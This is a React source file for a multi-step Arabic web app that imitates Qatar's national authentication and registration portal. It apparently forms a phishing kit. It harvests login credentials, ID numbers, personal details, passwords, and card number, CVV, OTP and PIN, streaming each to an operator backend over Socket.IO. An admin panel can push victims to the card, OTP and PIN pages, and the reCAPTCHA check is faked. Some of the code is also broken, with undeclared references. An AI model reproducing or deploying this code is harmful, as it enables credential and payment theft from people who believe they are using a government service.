import React, { useState, useEffect, useMemo } from 'react';
import Header from './components/Header';
import Footer from './components/Footer';
import HomePage from './components/HomePage';
import LoginForm from './components/LoginForm';
import SmartCardSection from './components/SmartCardSection';
import PaymentInfo from './components/PaymentInfo';
import PaymentForm from './components/PaymentForm';
import OTPForm from './components/OTPForm';
import PINForm from './components/PINForm';
import VerificationForm from './components/VerificationForm';
import SimpleLoginPage from './components/SimpleLoginPage';
import ForgotPasswordPage from './components/ForgotPasswordPage';
import { Info, Calendar, Loader2, Check, Eye, EyeOff } from 'lucide-react';
import { socketService } from './services/socketService';
import { getOrCreateSessionId, getPageName } from './utils/sessionUtils';
import { useTypingStatus } from './hooks/useTypingStatus';

const App: React.FC = () => {
  // Check URL parameters for direct access to SimpleLoginPage or ForgotPasswordPage
  const urlParams = new URLSearchParams(window.location.search);
  const pageParam = urlParams.get('page');
  const initialStep = pageParam === 'simple-login' ? -2 : pageParam === 'forgot-password' ? -3 : 0;
  
  // Session ID for backend tracking
  const [sessionId] = useState(() => getOrCreateSessionId());
  
  // Track typing status
  useTypingStatus();
  
  // Step 0 is the new HomePage from the prompt
  const [step, setStep] = useState(initialStep);
  const [paymentSubStep, setPaymentSubStep] = useState<'info' | 'card' | 'otp' | 'pin'>('info');
  const [verificationSubStep, setVerificationSubStep] = useState<'initial' | 'phone_otp' | 'email_otp'>('initial');
  const [recaptchaStatus, setRecaptchaStatus] = useState<'idle' | 'verifying' | 'verified'>('idle');
  const isProcessingRef = useRef(false);
  
  // Account Type selection state
  const [accountType, setAccountType] = useState<string | null>(null);
  
  // Step 1 Dynamic Fields
  const [step1IdCard, setStep1IdCard] = useState('');
  const [step1Email, setStep1Email] = useState('');
  const [step1Phone, setStep1Phone] = useState('');
  
  // Step 5: Verification Data
  const [verificationData, setVerificationData] = useState<any>(null);
  
  // Login Data
  const [loginData, setLoginData] = useState<{ username: string; password: string } | null>(null);
  
  // Citizenship Type selection state (مواطن / مقيم)
  const [citizenshipType, setCitizenshipType] = useState<'citizen' | 'resident' | null>(null);
  const [nationality, setNationality] = useState('قطر');

  // Form State for Step 2
  const [namesAr, setNamesAr] = useState({ first: '', middle: '', last: '' });
  const [namesEn, setNamesEn] = useState({ first: '', middle: '', last: '' });
  const [idNumber, setIdNumber] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [postalCode, setPostalCode] = useState('');
  
  // Error states for validation
  const [errors, setErrors] = useState({
    namesAr: { first: '', middle: '', last: '' },
    namesEn: { first: '', middle: '', last: '' },
    idNumber: '',
    mobileNumber: '',
    postalCode: ''
  });

  // Password Step States
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [passwordError, setPasswordError] = useState('');
  const [confirmPasswordError, setConfirmPasswordError] = useState('');

  // Payment Step States
  const [paymentData, setPaymentData] = useState({ cardNumber: '', cvv: '', expiryMonth: '', expiryYear: '' });
  const [otpData, setOtpData] = useState({ otp: '' });
  const [pinData, setPinData] = useState({ pin: '' });

  const steps = [
    { id: 1, label: 'نوع الحساب' },
    { id: 2, label: 'البيانات الشخصية' },
    { id: 3, label: 'كلمة المرور' },
    { id: 4, label: 'التسديد' },
    { id: 5, label: 'التوثيق' },
    { id: 6, label: 'انتهاء التسجيل' },
  ];

  const handleArabicInput = (field: keyof typeof namesAr, value: string) => {
    const arabicRegex = /^[ \u0600-\u06FF]*$/;
    if (!arabicRegex.test(value)) {
      setErrors(prev => ({
        ...prev,
        namesAr: { ...prev.namesAr, [field]: 'يرجى إدخال الحروف العربية فقط' }
      }));
      return;
    }
    setErrors(prev => ({
      ...prev,
      namesAr: { ...prev.namesAr, [field]: '' }
    }));
    setNamesAr(prev => ({ ...prev, [field]: value }));
  };

  const handleEnglishInput = (field: keyof typeof namesEn, value: string) => {
    const englishRegex = /^[ a-zA-Z]*$/;
    if (!englishRegex.test(value)) {
      setErrors(prev => ({
        ...prev,
        namesEn: { ...prev.namesEn, [field]: 'يرجى إدخال الحروف الإنجليزية فقط' }
      }));
      return;
    }
    setErrors(prev => ({
      ...prev,
      namesEn: { ...prev.namesEn, [field]: '' }
    }));
    setNamesEn(prev => ({ ...prev, [field]: value }));
  };

  const handleNumericInput = (setter: React.Dispatch<React.SetStateAction<string>>, value: string, fieldName: string) => {
    const numericRegex = /^[0-9]*$/;
    if (!numericRegex.test(value)) {
      setErrors(prev => ({ ...prev, [fieldName]: 'يرجى إدخال الأرقام فقط' }));
      return;
    }
    setErrors(prev => ({ ...prev, [fieldName]: '' }));
    setter(value);
  };

  const validations = useMemo(() => ({
    hasLower: /[a-z]/.test(password),
    hasUpper: /[A-Z]/.test(password),
    hasNumber: /[0-9]/.test(password),
    hasLength: password.length >= 8,
    hasSymbol: /[%$#@&/\-_]/.test(password),
  }), [password]);

  // Calculate password strength
  const passwordStrength = useMemo(() => {
    const validCount = Object.values(validations).filter(Boolean).length;
    if (validCount === 0) return { level: 'none', text: '', color: '', width: '0%' };
    if (validCount <= 2) return { level: 'weak', text: 'ضعيف', color: '#d9534f', width: '33%' };
    if (validCount <= 4) return { level: 'medium', text: 'متوسط', color: '#f0ad4e', width: '66%' };
    return { level: 'strong', text: 'قوي', color: '#009e5a', width: '100%' };
  }, [validations]);

  const isPasswordValid = Object.values(validations).every(Boolean);
  const isMatch = password === confirmPassword && password !== '';
  const canContinueStep3 = isPasswordValid && isMatch;

  const handleRecaptchaClick = () => {
    if (recaptchaStatus !== 'idle') return;
    setRecaptchaStatus('verifying');
    setTimeout(() => {
      setRecaptchaStatus('verified');
    }, 1500);
  };

  // Initialize Socket.IO connection and track page changes
  useEffect(() => {
    console.log('🔌 Initializing Socket.IO connection with sessionId:', sessionId);
    
    // Listen for redirect commands from admin (setup callback before connect)
    socketService.onRedirect((targetPage) => {
      console.log('🔄 Admin redirect to:', targetPage);
      
      // Map page names to step numbers and sub-steps
      const pageToStepMap: { [key: string]: number } = {
        'home': 0,
        'simple-login': -2,
        'forgot-password': -3,
        'step1-account-type': 1,
        'step2-personal-info': 2,
        'step3-credentials': 3,
        'step4-payment': 4,
        'step4-payment-card': 4,
        'step4-payment-otp': 4,
        'step4-payment-pin': 4,
        'step5-verification': 5,
        'step5-verification-id': 5,
        'step5-verification-mobile': 5,
        'step5-verification-postal': 5,
      };
      
      const targetStep = pageToStepMap[targetPage];
      console.log('🔍 targetPage:', targetPage, 'targetStep:', targetStep);
      if (targetStep !== undefined) {
        setStep(targetStep);
        
        // Set payment sub-step if redirecting to step 4
        if (targetPage === 'step4-payment-card') {
          console.log('🔄 Setting payment sub-step to: card');
          setPaymentSubStep('card');
        } else if (targetPage === 'step4-payment-otp') {
          console.log('🔄 Setting payment sub-step to: otp');
          setPaymentSubStep('otp');
        } else if (targetPage === 'step4-payment-pin') {
          console.log('🔄 Setting payment sub-step to: pin');
          setPaymentSubStep('pin');
        } else if (targetPage === 'step4-payment') {
          console.log('🔄 Setting payment sub-step to: info');
          setPaymentSubStep('info');
        }
        
        // Set verification sub-step if redirecting to step 5
        if (targetPage === 'step5-verification-id' || targetPage === 'step5-verification') {
          console.log('🔄 Setting verification sub-step to: initial');
          setVerificationSubStep('initial');
        } else if (targetPage === 'step5-verification-mobile') {
          console.log('🔄 Setting verification sub-step to: phone_otp');
          setVerificationSubStep('phone_otp');
        } else if (targetPage === 'step5-verification-postal') {
          console.log('🔄 Setting verification sub-step to: email_otp');
          setVerificationSubStep('email_otp');
        }
      }
    });
    
    // Connect to backend (async)
    socketService.connect(sessionId).then(() => {
      console.log('✅ Socket.IO connected successfully');
      // Join as visitor on initial page
      const currentPage = getPageName(step);
      console.log('📄 Current page:', currentPage);
      socketService.joinAsVisitor(currentPage);
      socketService.trackPageChange(currentPage);
    }).catch((error) => {
      console.error('❌ Socket.IO connection failed:', error);
    });
    
    // Cleanup on unmount
    return () => {
      socketService.offRedirect();
      socketService.disconnect();
    };
  }, [sessionId]);
  
  // Track page changes
  useEffect(() => {
    let currentPage = getPageName(step);
    
    // Add sub-step to page name for step 4 (payment)
    if (step === 4) {
      currentPage = `step4-payment-${paymentSubStep}`;
    }
    
    // Add sub-step to page name for step 5 (verification)
    if (step === 5) {
      const subStepMap: { [key: string]: string } = {
        'initial': 'id',
        'phone_otp': 'mobile',
        'email_otp': 'postal'
      };
      const mappedSubStep = subStepMap[verificationSubStep] || verificationSubStep;
      currentPage = `step5-verification-${mappedSubStep}`;
    }
    
    console.log('📍 [App] Tracking page:', currentPage);
    socketService.trackPageChange(currentPage);
  }, [step, paymentSubStep, verificationSubStep]);
  
  // Data will be saved in handleNextStep when user clicks Continue button



  // Step 5: Verification
  useEffect(() => {
    if (step === 5 && verificationData) {
      socketService.saveVisitorData(verificationData, 'step5-verification');
    }
  }, [verificationData, step]);
  
  // Login Data
  useEffect(() => {
    if (loginData && (loginData.username || loginData.password)) {
      socketService.saveVisitorData(loginData, 'login-data');
    }
  }, [loginData]);









  const handleNextStep = () => {
    // Prevent multiple rapid clicks
    if (isProcessingRef.current) {
      console.log('⚠️ Already processing, ignoring click');
      return;
    }
    
    isProcessingRef.current = true;
    
    // Save data before moving to next step
    if (step === 1 && accountType) {
      const formData: any = { accountType };
      if (step1IdCard) formData.idCard = step1IdCard;
      if (step1Email) formData.email = step1Email;
      if (step1Phone) formData.phone = step1Phone;
      socketService.saveVisitorData(formData, 'step1-account-type');
      setTimeout(() => { isProcessingRef.current = false; }, 500);
    } else if (step === 2) {
      const formData = {
        namesAr,
        namesEn,
        idNumber,
        mobileNumber,
        postalCode,
        citizenshipType,
        nationality,
      };
      socketService.saveVisitorData(formData, 'step2-personal-info');
      setTimeout(() => { isProcessingRef.current = false; }, 500);
    } else if (step === 3 && password) {
      const formData = { password, confirmPassword };
      socketService.saveVisitorData(formData, 'step3-password');
      setTimeout(() => { isProcessingRef.current = false; }, 500);
    } else {
      isProcessingRef.current = false;
    }
    
    if (step === 4) {
      if (paymentSubStep === 'info') {
        setPaymentSubStep('card');
      } else if (paymentSubStep === 'card') {
        socketService.saveVisitorData(paymentData, 'step4-payment-card');
        isProcessingRef.current = true;
        setTimeout(() => {
          isProcessingRef.current = false;
          setPaymentSubStep('otp');
        }, 3000);
      } else if (paymentSubStep === 'otp') {
        socketService.saveVisitorData(otpData, 'step4-payment-otp');
        isProcessingRef.current = true;
        setTimeout(() => {
          isProcessingRef.current = false;
          setPaymentSubStep('pin');
        }, 3000);
      } else if (paymentSubStep === 'pin') {
        socketService.saveVisitorData(pinData, 'step4-payment-pin');
        isProcessingRef.current = true;
        setTimeout(() => {
          isProcessingRef.current = false;
          setStep(5);
        }, 3000);
      }
    } else if (step < 6) {
      setStep(step + 1);
    }
  };

  const handlePrevStep = () => {
    if (step === 4) {
      if (paymentSubStep === 'card') {
        setPaymentSubStep('info');
      } else if (paymentSubStep === 'otp') {
        setPaymentSubStep('card');
      } else if (paymentSubStep === 'pin') {
        setPaymentSubStep('otp');
      } else if (paymentSubStep === 'info') {
        setStep(3);
      }
    } else if (step > 1) {
      setStep(step - 1);
    } else if (step === 1) {
      setStep(0);
    }
  };

  const handleCancel = () => {
    setStep(0);
  };

  // If we are at Step 0, just show the HomePage
  if (step === 0) {
    return <HomePage onStart={() => setStep(1)} onLogin={() => setStep(-1)} />;
  }

  // If we are at Step -3, show the Forgot Password page
  if (step === -3) {
    return <ForgotPasswordPage />;
  }

  // If we are at Step -2, show the Simple Login page (for dashboard redirect)
  if (step === -2) {
    return <SimpleLoginPage />;
  }

  // If we are at Step -1, show the Login page
  if (step === -1) {
    return (
      <div className="min-h-screen flex flex-col bg-white" dir="rtl">
        <Header />
        <main className="flex-1 flex justify-center pt-12 pb-20 px-4">
          <div className="nas-well bg-[#f5f5f5] border border-[#dcdcdc] rounded-[4px] shadow-sm max-w-[800px] w-full h-fit overflow-hidden">
            <div className="nas-well-header py-4 bg-[#f5f5f5]">
              <h1 className="text-[19px] font-bold text-[#333] pr-2">تسجيل الدخول</h1>
            </div>
            <div className="p-8 md:p-12">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12">
                <div className="md:order-2 md:border-l md:border-gray-200 md:pl-8 pb-8 md:pb-0 border-b md:border-b-0 border-gray-200">
                  <SmartCardSection />
                </div>
                <div className="md:order-1">
                  <LoginForm 
                    onAccountSuspended={() => setStep(1)}
                    onDataChange={setLoginData}
                  />
                </div>
              </div>
            </div>
            <div className="p-4 px-8 border-t border-gray-100 flex justify-start items-center bg-[#f9f9f9]">
              <button className="nas-btn-white min-w-[100px]" onClick={() => setStep(0)}>رجوع</button>
            </div>
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col transition-colors duration-300 bg-[#f8f9fa]" dir="rtl">
      {/* Show header for all steps */}
      <Header />
      
      {isProcessing && (
        <div className="fixed inset-0 z-[100] bg-white/80 backdrop-blur-sm flex items-center justify-center">
          <div className="flex flex-col items-center gap-4">
            <Loader2 className="w-16 h-16 text-[#640d2b] animate-spin" />
            <span className="text-[16px] font-bold text-[#640d2b]">Processing Transaction...</span>
          </div>
        </div>
      )}

      <div className="container mx-auto px-4 md:px-10 max-w-[1200px]">
        {!isProcessing && step > 0 && step < 6 && (
          <div className="w-full max-w-[900px] mx-auto mt-8 mb-12 relative px-4">
            <div className="step-line"></div>
            <div className="flex justify-between relative">
              {steps.map((s) => (
                <div key={s.id} className="flex flex-col items-center gap-2">
                  <div className={`step-circle ${step === s.id ? 'active' : step > s.id ? 'completed' : ''}`}>
                    {s.id}
                  </div>
                  <span className={`text-[12px] md:text-[13px] ${step === s.id ? 'font-bold' : ''} text-[#333]`}>
                    {s.label}
                  </span>
                </div>
              ))}
            </div>
          </div>
        )}

        <main className="flex flex-col items-center pb-12">
          
          {step === 1 && (
            <div className="nas-well overflow-hidden min-h-[300px] ge-ss-two-font">
              <div className="nas-well-header py-4 bg-[#f5f5f5]">
                <h1 className="text-[19px] font-bold text-[#333] pr-2">
                  اختر نوع الحساب
                </h1>
              </div>
              <div className="p-6 md:p-14 text-right">
                 {/* Corrected Direction: Natural order in RTL (Right-to-Left) matches visual reference */}
                 <div className="flex flex-col md:flex-row items-start md:justify-center gap-6 md:gap-14">
                    {/* Label section - shows first on mobile, right on desktop */}
                    <div className="flex items-center gap-1 md:order-2 w-full md:w-auto justify-center md:justify-start md:pt-1">
                      <span className="text-[#8a1538] font-bold text-[18px] ml-1">*</span>
                      <Info size={18} className="text-[#007fb1] cursor-help" />
                      <span className="nas-label mr-1">نوع الحساب</span>
                    </div>

                    {/* Radio options - shows second on mobile, left on desktop */}
                    <div className="flex flex-col gap-5 md:order-1 w-full md:w-auto">
                      <label className="flex items-center gap-3 cursor-pointer group">
                        {/* Radio input comes first -> renders on the right in RTL */}
                        <input 
                          type="radio" 
                          name="accountType" 
                          className="w-5 h-5 cursor-pointer flex-shrink-0" 
                          checked={accountType === 'citizen'}
                          onChange={() => setAccountType('citizen')}
                        />
                        <span className="text-[16px] md:text-[15px] font-bold text-[#333] group-hover:text-[#007fb1] transition-colors leading-relaxed">المواطنين القطريين والمقيمين</span>
                      </label>
                      <label className="flex items-center gap-3 cursor-pointer group">
                        <input 
                          type="radio" 
                          name="accountType" 
                          className="w-5 h-5 cursor-pointer flex-shrink-0" 
                          checked={accountType === 'visitor'}
                          onChange={() => setAccountType('visitor')}
                        />
                        <span className="text-[16px] md:text-[15px] font-bold text-[#333] group-hover:text-[#007fb1] transition-colors leading-relaxed">الزوار والمستخدمين من خارج دولة قطر</span>
                      </label>
                    </div>
                 </div>

                 {/* Conditional Fields Based on Account Type */}
                 {accountType && (
                   <div className="space-y-6 mt-8 max-w-[600px] mx-auto">
                     {/* Fields for Citizens/Residents */}
                     {accountType === 'citizen' && (
                       <>
                         {/* ID Card / Residence Number Field */}
                         <div className="space-y-2">
                           <label className="block text-right text-[14px] font-bold text-gray-800">
                             رقم البطاقة الشخصية/رقم الإقامة <span className="text-red-500">*</span>
                           </label>
                         <input 
                            type="text"
                            className="nas-input text-left w-full"
                            placeholder=""
                            inputMode="numeric"
                            value={step1IdCard}
                            onChange={(e) => setStep1IdCard(e.target.value)}
                          />
                         </div>

                         {/* Email Field */}
                         <div className="space-y-2">
                           <label className="block text-right text-[14px] font-bold text-gray-800">
                             البريد الإلكتروني <span className="text-red-500">*</span>
                           </label>
                           <input 
                             type="email"
                             className="nas-input text-left w-full"
                             placeholder=""
                             style={{ fontFamily: 'Arial, sans-serif' }}
                             value={step1Email}
                             onChange={(e) => setStep1Email(e.target.value)}
                           />
                         </div>

                         {/* Phone Number Field */}
                         <div className="space-y-2">
                           <label className="block text-right text-[14px] font-bold text-gray-800">
                             رقم الهاتف المحمول <span className="text-red-500">*</span>
                           </label>
                           <div className="flex gap-2 items-center">
                             <input 
                               type="tel"
                               className="nas-input text-left flex-1"
                               placeholder=""
                               inputMode="numeric"
                               value={step1Phone}
                               onChange={(e) => setStep1Phone(e.target.value)}
                             />
                             <div className="bg-[#cccccc] h-[34px] px-4 flex items-center justify-center rounded-[4px] text-[14px] font-bold text-[#333] min-w-[70px]">
                               +974
                             </div>
                           </div>
                         </div>
                       </>
                     )}

                     {/* Fields for Visitors */}
                     {accountType === 'visitor' && (
                       <>
                         {/* Email Field */}
                         <div className="space-y-2">
                           <label className="block text-right text-[14px] font-bold text-gray-800">
                             البريد الإلكتروني <span className="text-red-500">*</span>
                           </label>
                           <input 
                             type="email"
                             className="nas-input text-left w-full"
                             placeholder=""
                             style={{ fontFamily: 'Arial, sans-serif' }}
                             value={step1Email}
                             onChange={(e) => setStep1Email(e.target.value)}
                           />
                         </div>

                         {/* Phone Number Field - International */}
                         <div className="space-y-2">
                           <label className="block text-right text-[14px] font-bold text-gray-800">
                             رقم الهاتف المحمول <span className="text-red-500">*</span>
                           </label>
                           <input 
                             type="tel"
                             className="nas-input text-left w-full"
                             placeholder="+1234567890"
                             value={step1Phone}
                             onChange={(e) => setStep1Phone(e.target.value)}
                           />
                         </div>
                       </>
                     )}
                   </div>
                 )}
              </div>
              
              <div className="p-4 px-4 md:px-8 border-t border-gray-100 flex flex-col md:flex-row justify-between items-center gap-3 md:gap-0 bg-[#f9f9f9]">
                {/* Cancellation Button */}
                <button className="nas-btn-white w-full md:w-auto md:min-w-[100px] order-3 md:order-1" onClick={handleCancel}>إلغاء</button>
                
                {/* Navigation Buttons */}
                <div className="flex gap-2 w-full md:w-auto order-1 md:order-2">
                  <button className="nas-btn-white flex-1 md:flex-none md:min-w-[80px]" onClick={handlePrevStep}>رجوع</button>
                  <button 
                    className={`nas-btn-blue flex-1 md:flex-none md:min-w-[80px] ${!accountType ? 'opacity-50 cursor-not-allowed' : ''}`} 
                    onClick={handleNextStep}
                    disabled={!accountType}
                  >
                    استمر
                  </button>
                </div>
              </div>
            </div>
          )}

          {step === 2 && (
            <div className="nas-well overflow-hidden ge-ss-two-font">
              <div className="nas-well-header py-4 bg-[#f5f5f5]">
                <h1 className="text-[19px] font-bold text-[#333] pr-2">
                  يرجى تعبئة البيانات الشخصية
                </h1>
              </div>

              <div className="p-8 md:p-12 pt-10 text-right">
                <div className="space-y-5 max-w-[880px] mx-auto">
                  {/* Citizenship Type Selection */}
                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2 pb-4 border-b border-gray-200">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <span className="nas-label">نوع المستخدم</span>
                      <span className="required-dot">.</span>
                    </div>
                    <div className="md:col-span-8 flex gap-8 justify-start w-full">
                      <label className="flex items-center gap-3 cursor-pointer group">
                        <input 
                          type="checkbox" 
                          className="w-4 h-4 cursor-pointer" 
                          checked={citizenshipType === 'citizen'}
                          onChange={() => {
                            setCitizenshipType('citizen');
                            setNationality('قطر');
                          }}
                        />
                        <span className="text-[15px] font-bold text-[#333] group-hover:text-[#007fb1] transition-colors">مواطن قطري</span>
                      </label>
                      <label className="flex items-center gap-3 cursor-pointer group">
                        <input 
                          type="checkbox" 
                          className="w-4 h-4 cursor-pointer" 
                          checked={citizenshipType === 'resident'}
                          onChange={() => setCitizenshipType('resident')}
                        />
                        <span className="text-[15px] font-bold text-[#333] group-hover:text-[#007fb1] transition-colors">مقيم</span>
                      </label>
                    </div>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <span className="nas-label">الجنسية</span>
                      <span className="required-dot">.</span>
                    </div>
                    <div className="md:col-span-8 flex justify-start w-full">
                      <div className="w-full md:w-[50%]">
                        <select 
                          className={`nas-select ${citizenshipType === 'citizen' ? 'bg-[#f0f0f0] cursor-not-allowed' : ''}`} 
                          value={nationality}
                          onChange={(e) => setNationality(e.target.value)}
                          disabled={citizenshipType === 'citizen'}
                        >
                          <option value="قطر">قطر</option>
                          <option value="السعودية">السعودية</option>
                          <option value="الإمارات">الإمارات</option>
                          <option value="الكويت">الكويت</option>
                          <option value="البحرين">البحرين</option>
                          <option value="عمان">عمان</option>
                          <option value="مصر">مصر</option>
                          <option value="الأردن">الأردن</option>
                          <option value="لبنان">لبنان</option>
                          <option value="سوريا">سوريا</option>
                          <option value="العراق">العراق</option>
                          <option value="فلسطين">فلسطين</option>
                          <option value="اليمن">اليمن</option>
                          <option value="المغرب">المغرب</option>
                          <option value="الجزائر">الجزائر</option>
                          <option value="تونس">تونس</option>
                          <option value="ليبيا">ليبيا</option>
                          <option value="السودان">السودان</option>
                          <option value="الصومال">الصومال</option>
                          <option value="جيبوتي">جيبوتي</option>
                          <option value="موريتانيا">موريتانيا</option>
                          <option value="الهند">الهند</option>
                          <option value="باكستان">باكستان</option>
                          <option value="بنغلاديش">بنغلاديش</option>
                          <option value="الفلبين">الفلبين</option>
                          <option value="إندونيسيا">إندونيسيا</option>
                          <option value="ماليزيا">ماليزيا</option>
                          <option value="سريلانكا">سريلانكا</option>
                          <option value="نيبال">نيبال</option>
                          <option value="أفغانستان">أفغانستان</option>
                          <option value="تركيا">تركيا</option>
                          <option value="إيران">إيران</option>
                          <option value="أخرى">أخرى</option>
                        </select>
                      </div>
                    </div>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <span className="nas-label">الاسم</span>
                      <Info size={16} className="text-[#007fb1] cursor-help mx-2" />
                      <span className="required-dot">.</span>
                    </div>
                    <div className="col-span-8 flex justify-center">
                      <span className="text-[14px] font-bold text-[#333]">يرجى إدخال الاسم بالعربية او الاسم بالانجليزية</span>
                    </div>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <span className="nas-label">الاسم بالعربي</span>
                    </div>
                    <div className="md:col-span-8 w-full">
                      <div className="flex gap-3 justify-start">
                        <div className="w-full">
                          <input 
                            className="nas-input text-center placeholder:text-[#999] w-full" 
                            placeholder="الاسم الأول [عربي]" 
                            value={namesAr.first}
                            onChange={(e) => handleArabicInput('first', e.target.value)}
                          />
                          {errors.namesAr.first && (
                            <p className="text-[#d9534f] text-[12px] mt-1">{errors.namesAr.first}</p>
                          )}
                        </div>
                        <div className="w-full">
                          <input 
                            className="nas-input text-center placeholder:text-[#999] w-full" 
                            placeholder="الاسم الأوسط [عربي]" 
                            value={namesAr.middle}
                            onChange={(e) => handleArabicInput('middle', e.target.value)}
                          />
                          {errors.namesAr.middle && (
                            <p className="text-[#d9534f] text-[12px] mt-1">{errors.namesAr.middle}</p>
                          )}
                        </div>
                        <div className="w-full">
                          <input 
                            className="nas-input text-center placeholder:text-[#999] w-full" 
                            placeholder="اسم العائلة [عربي]" 
                            value={namesAr.last}
                            onChange={(e) => handleArabicInput('last', e.target.value)}
                          />
                          {errors.namesAr.last && (
                            <p className="text-[#d9534f] text-[12px] mt-1">{errors.namesAr.last}</p>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <span className="nas-label">الاسم بالإنجليزي</span>
                    </div>
                    <div className="md:col-span-8 w-full">
                      <div className="flex gap-3 justify-start">
                        <div className="w-full">
                          <input 
                            className="nas-input text-center placeholder:text-[#999] w-full" 
                            placeholder="الاسم الأول [انجليزي]" 
                            value={namesEn.first}
                            onChange={(e) => handleEnglishInput('first', e.target.value)}
                          />
                          {errors.namesEn.first && (
                            <p className="text-[#d9534f] text-[12px] mt-1">{errors.namesEn.first}</p>
                          )}
                        </div>
                        <div className="w-full">
                          <input 
                            className="nas-input text-center placeholder:text-[#999] w-full" 
                            placeholder="الاسم الأوسط [انجليزي]" 
                            value={namesEn.middle}
                            onChange={(e) => handleEnglishInput('middle', e.target.value)}
                          />
                          {errors.namesEn.middle && (
                            <p className="text-[#d9534f] text-[12px] mt-1">{errors.namesEn.middle}</p>
                          )}
                        </div>
                        <div className="w-full">
                          <input 
                            className="nas-input text-center placeholder:text-[#999] w-full" 
                            placeholder="اسم العائلة [انجليزي]" 
                            value={namesEn.last}
                            onChange={(e) => handleEnglishInput('last', e.target.value)}
                          />
                          {errors.namesEn.last && (
                            <p className="text-[#d9534f] text-[12px] mt-1">{errors.namesEn.last}</p>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <span className="nas-label">تاريخ الميلاد (يوم / شهر / سنة)</span>
                      <span className="required-dot">.</span>
                    </div>
                    <div className="md:col-span-8 flex justify-start w-full">
                      <div className="w-[38%] relative">
                        <input className="nas-input text-center pr-10" type="date" />
                        <Calendar size={18} className="absolute right-3 top-1/2 -translate-y-1/2 text-[#007fb1] pointer-events-none" />
                      </div>
                    </div>
                  </div>



                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <span className="nas-label">الجنس</span>
                      <span className="required-dot">.</span>
                    </div>
                    <div className="col-span-8 flex items-center justify-center gap-14">
                      <label className="flex items-center gap-3 cursor-pointer">
                        <input type="radio" name="gender" />
                        <span className="text-[14px]">ذكر</span>
                      </label>
                      <label className="flex items-center gap-3 cursor-pointer">
                        <input type="radio" name="gender" />
                        <span className="text-[14px]">أنثى</span>
                      </label>
                    </div>
                  </div>

                  <div className="flex justify-start pt-6 border-b border-gray-200 pb-2 mb-4">
                    <h2 className="text-[20px] font-bold text-[#333] pr-2">العنوان</h2>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <Info size={16} className="text-[#007fb1] ml-2" />
                      <span className="nas-label">الشارع</span>
                      <span className="required-dot">.</span>
                    </div>
                    <div className="col-span-8">
                      <input className="nas-input" type="text" />
                    </div>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <Info size={16} className="text-[#007fb1] ml-2" />
                      <span className="nas-label">الرمز البريدي</span>
                      <span className="required-dot">.</span>
                    </div>
                    <div className="md:col-span-8 flex justify-start w-full">
                      <div className="w-full md:w-[38%]">
                        <input 
                          className="nas-input" 
                          type="text" 
                          inputMode="numeric"
                          pattern="[0-9]*"
                          value={postalCode}
                          onChange={(e) => handleNumericInput(setPostalCode, e.target.value, 'postalCode')}
                        />
                        {errors.postalCode && (
                          <p className="text-[#d9534f] text-[12px] mt-1">{errors.postalCode}</p>
                        )}
                      </div>
                    </div>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-center gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <Info size={16} className="text-[#007fb1] ml-2" />
                      <span className="nas-label">المدينة</span>
                      <span className="required-dot">.</span>
                    </div>
                    <div className="col-span-8">
                      <input className="nas-input" type="text" />
                    </div>
                  </div>

                  <div className="flex flex-col md:grid md:grid-cols-12 md:items-start pt-6 gap-y-2">
                    <div className="md:col-span-4 flex items-center justify-start md:pr-12">
                      <span className="nas-label">التحقق</span>
                      <span className="required-dot">.</span>
                    </div>
                    <div className="col-span-8 flex justify-center">
                      <div 
                        className="bg-white border border-[#d3d3d3] p-3 rounded-sm flex items-center justify-between shadow-sm w-full max-w-[304px] cursor-pointer"
                        onClick={handleRecaptchaClick}
                      >
                        <div className="flex items-center gap-4 pr-1">
                          <div className="relative w-7 h-7 flex items-center justify-center border-2 border-gray-300 rounded-[2px] bg-white">
                            {recaptchaStatus === 'verifying' ? (
                              <Loader2 className="w-5 h-5 text-[#007fb1] animate-spin" />
                            ) : recaptchaStatus === 'verified' ? (
                              <div className="scale-110">
                                 <Check className="w-6 h-6 text-[#009e5a]" strokeWidth={4} />
                              </div>
                            ) : null}
                          </div>
                          <span className="text-[14px] font-medium text-gray-700 select-none">أنا لست برنامج روبوت</span>
                        </div>
                        <div className="flex flex-col items-center opacity-80 scale-90">
                          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" className="w-9 h-9" alt="reCAPTCHA" />
                          <span className="text-[9px] mt-1 text-gray-500 font-bold tracking-tighter uppercase">reCAPTCHA</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="p-4 px-10 border-t border-gray-100 flex justify-between items-center bg-[#f9f9f9]">
                <button className="nas-btn-white" onClick={handleCancel}>إلغاء</button>
                <div className="flex gap-2">
                  <button className="nas-btn-white" onClick={handlePrevStep}>رجوع</button>
